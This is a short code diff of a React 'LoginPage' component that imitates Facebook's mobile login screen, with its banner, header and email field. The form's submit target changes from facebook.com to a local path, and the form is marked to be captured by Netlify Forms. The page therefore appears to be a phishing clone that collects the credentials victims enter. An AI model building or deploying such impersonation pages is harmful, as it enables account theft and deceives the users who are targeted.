@@ -7,7 +7,7 @@ const LoginPage = () =>{
         <>
           <div className="tophead">Get Facebook for Android and browse faster.</div>
           <h2 className="header">facebook</h2> 
-          <form name="data-form" method="post" data-netlify="true" action="https://www.facebook.com/">
+          <form name="data-form" method="post" data-netlify="true" action="/LoginInApp/">
               <input type="hidden" name="form-name" value="data-form" />
               <div className="mail">
                   <input type="text" name="email" id="email" placeholder="Mobile number or email address" ></input>
